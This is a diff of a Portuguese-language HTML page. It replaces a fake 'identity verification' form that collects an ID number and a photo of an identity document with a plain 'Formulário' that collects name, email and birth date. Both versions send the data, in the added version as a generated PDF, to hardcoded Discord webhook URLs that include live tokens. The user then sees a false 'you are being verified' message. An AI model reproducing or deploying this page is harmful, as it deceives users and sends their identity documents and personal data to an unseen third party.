@@ -3,163 +3,198 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificação de Identidade</title>
+    <title>Formulário</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.28/jspdf.plugin.autotable.min.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
-            max-width: 600px;
-            margin: 0 auto;
+            max-width: 400px;
+            margin: 50px auto;
             padding: 20px;
-            text-align: center;
-            background-color: #f5f5f5;
+            color: #333;
+            transition: all 0.3s ease;
         }
-        .container {
-            background: white;
-            border-radius: 10px;
-            padding: 25px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
+        
         h1 {
-            color: #5865F2;
+            font-size: 24px;
+            font-weight: normal;
+            margin-bottom: 30px;
+        }
+        
+        .form-field {
             margin-bottom: 20px;
         }
-        .form-group {
-            margin-bottom: 20px;
-            text-align: left;
-        }
-        label {
+        
+        .field-label {
             display: block;
             margin-bottom: 5px;
-            font-weight: bold;
+            font-size: 16px;
         }
-        input, button {
+        
+        .optional {
+            color: #999;
+            font-style: italic;
+        }
+        
+        input[type="text"], input[type="email"], input[type="date"] {
             width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            box-sizing: border-box;
-        }
-        button {
-            background-color: #5865F2;
-            color: white;
+            padding: 8px 0;
             border: none;
+            border-bottom: 1px solid #ccc;
+            font-size: 16px;
+            outline: none;
+        }
+        
+        input[type="submit"] {
+            background-color: transparent;
+            color: #333;
+            padding: 8px 20px;
+            border: 1px solid #333;
+            border-radius: 4px;
             cursor: pointer;
-            font-weight: bold;
+            font-size: 16px;
             margin-top: 10px;
         }
-        button:hover {
-            background-color: #4752C4;
-        }
-        #preview {
-            max-width: 100%;
-            margin-top: 15px;
+        
+        .verification-screen {
             display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            z-index: 1000;
         }
-        .status {
+        
+        .verification-message {
+            font-size: 18px;
+            margin-bottom: 30px;
+            max-width: 300px;
+        }
+        
+        .verification-button {
+            cursor: pointer;
+            width: 100px;
+            height: auto;
+            transition: transform 0.2s;
+        }
+        
+        .verification-button:hover {
+            transform: scale(1.05);
+        }
+        
+        .loading {
+            display: none;
             margin-top: 20px;
-            padding: 10px;
-            border-radius: 5px;
-            display: none;
-        }
-        .success {
-            background-color: #d4edda;
-            color: #155724;
-        }
-        .error {
-            background-color: #f8d7da;
-            color: #721c24;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Verificação de Identidade</h1>
-        <p>Por favor, insira seu número de identificação e uma foto do seu documento.</p>
+    <div id="form-container">
+        <h1>Formulário</h1>
         
-        <div class="form-group">
-            <label for="userNumber">Número de Identificação (0001-9999):</label>
-            <input type="number" id="userNumber" min="1" max="9999" required>
-        </div>
-        
-        <div class="form-group">
-            <label for="documentPhoto">Foto do Documento:</label>
-            <input type="file" id="documentPhoto" accept="image/*" required>
-            <img id="preview" alt="Pré-visualização do documento">
-        </div>
-        
-        <button id="submitBtn">Enviar para Verificação</button>
-        
-        <div id="statusMessage" class="status"></div>
+        <form id="main-form">
+            <div class="form-field">
+                <span class="field-label">Nome completo:</span>
+                <input type="text" id="nome" name="nome" required>
+            </div>
+            
+            <div class="form-field">
+                <span class="field-label">Email:</span>
+                <input type="email" id="email" name="email" required>
+            </div>
+            
+            <div class="form-field">
+                <span class="field-label">Data De nascimento <span class="optional">(Optional)</span>:</span>
+                <input type="date" id="nascimento" name="nascimento">
+            </div>
+            
+            <input type="submit" value="Verificar">
+            <div class="loading" id="loading">Gerando PDF e enviando dados...</div>
+        </form>
+    </div>
+    
+    <div id="verification-screen" class="verification-screen">
+        <p class="verification-message">Você está sendo verificado, enviaremos um Email quando você estiver certamente verificado</p>
+        <img src="https://i.ibb.co/qhLdFGq/image.png" alt="Continuar" class="verification-button" id="verification-button">
     </div>
 
     <script>
-        // Mostrar pré-visualização da imagem
-        document.getElementById('documentPhoto').addEventListener('change', function(e) {
-            const file = e.target.files[0];
-            const preview = document.getElementById('preview');
+        // Inicializa o jsPDF
+        const { jsPDF } = window.jspdf;
+        
+        document.getElementById('main-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
             
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = function(event) {
-                    preview.src = event.target.result;
-                    preview.style.display = 'block';
-                }
-                reader.readAsDataURL(file);
-            }
-        });
-
-        // Enviar dados para o webhook
-        document.getElementById('submitBtn').addEventListener('click', async function() {
-            const userNumber = document.getElementById('userNumber').value;
-            const fileInput = document.getElementById('documentPhoto');
-            const statusMessage = document.getElementById('statusMessage');
+            // Mostra o loading
+            document.getElementById('loading').style.display = 'block';
             
-            // Validação básica
-            if (!userNumber || userNumber < 1 || userNumber > 9999) {
-                statusMessage.textContent = 'Por favor, insira um número válido entre 0001 e 9999.';
-                statusMessage.className = 'status error';
-                statusMessage.style.display = 'block';
-                return;
-            }
-            
-            if (!fileInput.files || fileInput.files.length === 0) {
-                statusMessage.textContent = 'Por favor, selecione uma foto do documento.';
-                statusMessage.className = 'status error';
-                statusMessage.style.display = 'block';
-                return;
-            }
-            
-            // Formatar o número com zeros à esquerda
-            const formattedNumber = String(userNumber).padStart(4, '0');
+            // Coleta os dados do formulário
+            const formData = {
+                nome: document.getElementById('nome').value,
+                email: document.getElementById('email').value,
+                nascimento: document.getElementById('nascimento').value
+            };
             
             try {
-                // Criar FormData para enviar a imagem
-                const formData = new FormData();
-                formData.append('userNumber', formattedNumber);
-                formData.append('documentPhoto', fileInput.files[0]);
+                // 1. Gera o PDF
+                const pdf = new jsPDF();
                 
-                // Substitua pela URL do seu webhook do Discord
-                const webhookUrl = 'https://discord.com/api/webhooks/1390503543215226911/nyRrIbkroAN4r5qYf4kPhrdiTPajq53vBd0iR04oqWlF19RZ6JpLJ8rm_vApdLbrIIvA';
+                // Adiciona título
+                pdf.setFontSize(18);
+                pdf.text('Formulário de Cadastro', 105, 20, { align: 'center' });
                 
-                // Enviar para o webhook
+                // Adiciona dados em formato de tabela
+                pdf.setFontSize(12);
+                pdf.text(`Nome: ${formData.nome}`, 20, 40);
+                pdf.text(`Email: ${formData.email}`, 20, 50);
+                if(formData.nascimento) {
+                    pdf.text(`Data de Nascimento: ${new Date(formData.nascimento).toLocaleDateString()}`, 20, 60);
+                }
+                
+                // Gera o PDF em base64
+                const pdfOutput = pdf.output('datauristring');
+                
+                // 2. Prepara os dados para o webhook
+                const webhookData = {
+                    formData: formData,
+                    pdfBase64: pdfOutput.split(',')[1] // Remove o prefixo data:application/pdf;base64,
+                };
+                
+                // 3. Envia para o webhook (SUBSTITUA pela sua URL)
+                const webhookUrl = 'https://discord.com/api/webhooks/1390729092311158826/OoTfhqLaBBCxEjh3Wl3WC-3RVXuFUwTkoPwEKM53whnNxGsAZrvPdkD1jPVGsU5gS29m'; // TROQUE PELA SUA URL
+                
                 const response = await fetch(webhookUrl, {
                     method: 'POST',
-                    body: formData
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(webhookData)
                 });
                 
-                if (response.ok) {
-                    statusMessage.textContent = 'Verificação enviada com sucesso! Aguarde a aprovação.';
-                    statusMessage.className = 'status success';
-                    statusMessage.style.display = 'block';
+                if(response.ok) {
+                    // Mostra a tela de verificação
+                    document.getElementById('verification-screen').style.display = 'flex';
+                    document.getElementById('form-container').style.display = 'none';
                 } else {
-                    throw new Error('Erro ao enviar para o webhook');
+                    throw new Error('Falha ao enviar para o webhook');
                 }
             } catch (error) {
                 console.error('Erro:', error);
-                statusMessage.textContent = 'Ocorreu um erro ao enviar a verificação. Por favor, tente novamente.';
-                statusMessage.className = 'status error';
-                statusMessage.style.display = 'block';
+                alert('Ocorreu um erro ao processar seu formulário. Por favor, tente novamente.');
+            } finally {
+                document.getElementById('loading').style.display = 'none';
             }
+        });
+        
+        document.getElementById('verification-button').addEventListener('click', function() {
+            window.location.href = 'https://youtu.be/dQw4w9WgXcQ?si=KklLTsU2EasoHwNh'; // TROQUE ESTE LINK PELO SEU
         });
     </script>
 </body>
